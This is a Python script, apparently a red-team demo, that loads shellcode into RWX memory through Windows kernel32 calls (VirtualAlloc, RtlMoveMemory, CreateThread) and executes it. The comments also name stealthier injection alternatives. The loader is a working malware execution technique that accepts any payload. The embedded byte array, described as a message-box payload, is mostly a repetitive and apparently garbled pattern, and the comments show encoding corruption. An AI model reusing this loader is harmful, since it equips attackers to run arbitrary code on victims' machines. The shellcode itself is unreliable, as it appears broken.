import ctypes
import os
import sys
from datetime import datetime

# --- Configura√ß√£o da API do Windows (Kernel32) ---
if os.name != 'nt':
    print("[!] ERRO: Este script √© estritamente para demonstra√ß√£o no Windows (nt).")
    sys.exit(1)
    
kernel32 = ctypes.windll.kernel32

# Constantes da API
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# --- Shellcode de Exemplo (Message Box "Hello, Red Team") ---
# (Shellcode de 32 bits, para fins de demonstra√ß√£o em VMs de laborat√≥rio)
# Este payload simples abre uma caixa de mensagem no Windows.
SHELLCODE_BYTES = (
    b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
    b"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
    b"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    b"\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50"
    b"\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6"
    b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf1\x03\x7d\xf8\x3b"
    b"\x7d\x24\x75\xe9\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58"
    b"\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
    b"\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x84\x5d\x68\x33\x32\x00"
    b"\x00\x68\x75\x73\x65\x72\x68\x6e\x65\x73\x73\x68\x57\x69\x6e\x69"
    b"\x74\x89\x6c\x24\x04\x72\x01\xe8\x60\x68\x6c\x6c\x33\x32\x00\x64"
    b"\x00\x68\x65\x73\x74\x41\x89\x64\x24\x08\x8b\x4c\x24\x04\x8b\x72"
    b"\x28\x01\xd0\x41\x8b\x4a\x10\x89\x4e\x08\x52\x51\x68\x6c\x6c\x4f"
    b"\x61\x89\x68\x24\x0c\x8b\x4c\x24\x04\x8b\x72\x28\x01\xd0\x41\x50"
    b"\x89\xe3\x51\x52\x89\x6c\x24\x18\xeb\x10\x68\x57\x69\x6e\x41\x89"
    b"\x68\x24\x1c\x68\x4d\x65\x73\x73\x89\x64\x24\x20\x68\x62\x6f\x78"
    b"\x41\x89\x64\x24\x24\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04"
    b"\x8b\x50\x20\x01\xd0\x41\x68\x45\x78\x69\x74\x89\x68\x24\x28\x68"
    b"\x50\x72\x6f\x63\x89\x64\x24\x2c\x68\x6e\x65\x73\x73\x89\x64\x24"
    b"\x30\x68\x74\x68\x72\x65\x89\x64\x24\x34\x68\x45\x78\x69\x74\x89"
    b"\x64\x24\x38\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50"
    b"\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24\x3c\x68\x65\x73"
    b"\x73\x64\x89\x64\x24\x40\x68\x74\x68\x72\x65\x89\x64\x24\x44\x68"
    b"\x45\x78\x69\x74\x89\x64\x24\x48\xc6\x05\x00\x00\x00\x00\x00\x8b"
    b"\x54\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64"
    b"\x24\x4c\x68\x65\x73\x73\x64\x89\x64\x24\x50\x68\x74\x68\x72\x65"
    b"\x89\x64\x24\x54\x68\x45\x78\x69\x74\x89\x64\x24\x58\xc6\x05\x00"
    b"\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50"
    b"\x72\x6f\x63\x89\x64\x24\x5c\x68\x65\x73\x73\x64\x89\x64\x24\x60"
    b"\x68\x74\x68\x72\x65\x89\x64\x24\x64\x68\x45\x78\x69\x74\x89\x64"
    b"\x24\x68\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20"
    b"\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24\x6c\x68\x65\x73\x73"
    b"\x64\x89\x64\x24\x70\x68\x74\x68\x72\x65\x89\x64\x24\x74\x68\x45"
    b"\x78\x69\x74\x89\x64\x24\x78\xc6\x05\x00\x00\x00\x00\x00\x8b\x54"
    b"\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24"
    b"\x7c\x68\x65\x73\x73\x64\x89\x64\x24\x80\x68\x74\x68\x72\x65\x89"
    b"\x64\x24\x84\x68\x45\x78\x69\x74\x89\x64\x24\x88\xc6\x05\x00\x00"
    b"\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72"
    b"\x6f\x63\x89\x64\x24\x8c\x68\x65\x73\x73\x64\x89\x64\x24\x90\x68"
    b"\x74\x68\x72\x65\x89\x64\x24\x94\x68\x45\x78\x69\x74\x89\x64\x24"
    b"\x98\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01"
    b"\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24\x9c\x68\x65\x73\x73\x64"
    b"\x89\x64\x24\xa0\x68\x74\x68\x72\x65\x89\x64\x24\xa4\x68\x45\x78"
    b"\x69\x74\x89\x64\x24\xa8\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24"
    b"\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24\xac"
    b"\x68\x65\x73\x73\x64\x89\x64\x24\xb0\x68\x74\x68\x72\x65\x89\x64"
    b"\x24\xb4\x68\x45\x78\x69\x74\x89\x64\x24\xb8\xc6\x05\x00\x00\x00"
    b"\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f"
    b"\x63\x89\x64\x24\xbc\x68\x65\x73\x73\x64\x89\x64\x24\xc0\x68\x74"
    b"\x68\x72\x65\x89\x64\x24\xc4\x68\x45\x78\x69\x74\x89\x64\x24\xc8"
    b"\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0"
    b"\x41\x68\x50\x72\x6f\x63\x89\x64\x24\xcc\x68\x65\x73\x73\x64\x89"
    b"\x64\x24\xd0\x68\x74\x68\x72\x65\x89\x64\x24\xd4\x68\x45\x78\x69"
    b"\x74\x89\x64\x24\xd8\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04"
    b"\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24\xdc\x68"
    b"\x65\x73\x73\x64\x89\x64\x24\xe0\x68\x74\x68\x72\x65\x89\x64\x24"
    b"\xe4\x68\x45\x78\x69\x74\x89\x64\x24\xe8\xc6\x05\x00\x00\x00\x00"
    b"\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63"
    b"\x89\x64\x24\xec\x68\x65\x73\x73\x64\x89\x64\x24\xf0\x68\x74\x68"
    b"\x72\x65\x89\x64\x24\xf4\x68\x45\x78\x69\x74\x89\x64\x24\xf8\xc6"
    b"\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0\x41"
    b"\x68\x50\x72\x6f\x63\x89\x64\x24\xfc\x68\x65\x73\x73\x64\x89\x64"
    b"\x24\x00\x01\x68\x74\x68\x72\x65\x89\x64\x24\x04\x01\x68\x45\x78"
    b"\x69\x74\x89\x64\x24\x08\x01\xc6\x05\x00\x00\x00\x00\x00\x8b\x54"
    b"\x24\x04\x8b\x50\x20\x01\xd0\x41\x68\x50\x72\x6f\x63\x89\x64\x24"
    b"\x0c\x01\x68\x65\x73\x73\x64\x89\x64\x24\x10\x01\x68\x74\x68\x72"
    b"\x65\x89\x64\x24\x14\x01\x68\x45\x78\x69\x74\x89\x64\x24\x18\x01"
    b"\xc6\x05\x00\x00\x00\x00\x00\x8b\x54\x24\x04\x8b\x50\x20\x01\xd0"
    b"\x41\x68\x50\x72\x6f\x63\x89\x64\x24\x1c\x01\x68\x65\x73\x73\x64"
    b"\x89\x64\x24\x20\x01\x68\x74\x68\x72\x65\x89\x64\x24\x24\x01\x68"
    b"\x45\x78\x69\x74\x89\x64\x24\x28\x01\xc6\x05\x00\x00\x00\x00\x00"
)


def allocate_and_execute(shellcode_bytes):
    """Aloca mem√≥ria RWX (Read-Write-Execute), copia o shellcode e o executa."""
    
    # 1. Alocar Mem√≥ria Virtual (VirtualAlloc)
    # Tenta obter um endere√ßo de mem√≥ria com as permiss√µes mais permissivas
    addr = kernel32.VirtualAlloc(
        0,                                   
        len(shellcode_bytes),                
        MEM_COMMIT | MEM_RESERVE,            
        PAGE_EXECUTE_READWRITE               
    )

    if addr == 0:
        print(f"[!] Erro Cr√≠tico: Falha ao alocar mem√≥ria. C√≥digo: {kernel32.GetLastError()}")
        return

    print(f"[{datetime.now().strftime('%H:%M:%S')}] ‚úÖ Mem√≥ria RWX alocada no endere√ßo: 0x{addr:08x}")

    # 2. Copiar o Shellcode (RtlMoveMemory)
    # Converte os bytes do shellcode para um ponteiro C e copia para o endere√ßo alocado
    buffer = ctypes.c_char_p(shellcode_bytes)
    kernel32.RtlMoveMemory(addr, buffer, len(shellcode_bytes))
    
    print(f"[{datetime.now().strftime('%H:%M:%S')}] ‚úÖ {len(shellcode_bytes)} bytes copiados. Preparando execu√ß√£o em mem√≥ria...")

    # 3. Executar o Shellcode (CreateThread)
    # Cria uma nova thread cujo ponto de entrada √© o endere√ßo do shellcode (addr)
    thread_id = ctypes.c_ulong(0)
    
    # CreateThread √© um TTP conhecido; em scripts mais furtivos, CallWindowProc ou QueueUserAPC seriam usados.
    handle = kernel32.CreateThread(
        0, 0, addr, 0, 0, ctypes.byref(thread_id)
    )
    
    if handle == 0:
        print(f"[!] Erro: Falha ao criar a thread de execu√ß√£o. C√≥digo: {kernel32.GetLastError()}")
        # Tenta liberar a mem√≥ria mesmo com erro
        kernel32.VirtualFree(addr, 0, 0x8000) 
        return

    print(f"[{datetime.now().strftime('%H:%M:%S')}] üöÄ Shellcode em execu√ß√£o na Thread ID: {thread_id.value}. Aguardando...")

    # 4. Esperar a execu√ß√£o (para manter o processo Python vivo at√© que o shellcode termine)
    kernel32.WaitForSingleObject(handle, -1) 
    
    print(f"[{datetime.now().strftime('%H:%M:%S')}] üèÅ Execu√ß√£o conclu√≠da. Limpeza da mem√≥ria...")
    
    # 5. Libera√ß√£o da Mem√≥ria (Good OPSEC)
    kernel32.VirtualFree(addr, 0, 0x8000) # 0x8000 = MEM_RELEASE

if __name__ == '__main__':
    print("--- ECHOESPRINTER: Shellcode Loader In-Memory (Red Team Demo) ---")
    print(f"Alvo: Windows API via Python ctypes. Shellcode Size: {len(SHELLCODE_BYTES)} bytes")
    print("-" * 65)
    
    allocate_and_execute(SHELLCODE_BYTES)

    print("-" * 65)
    print("Fim do ECHOESPRINTER. Verifique o desktop do Windows para a caixa de mensagem.")
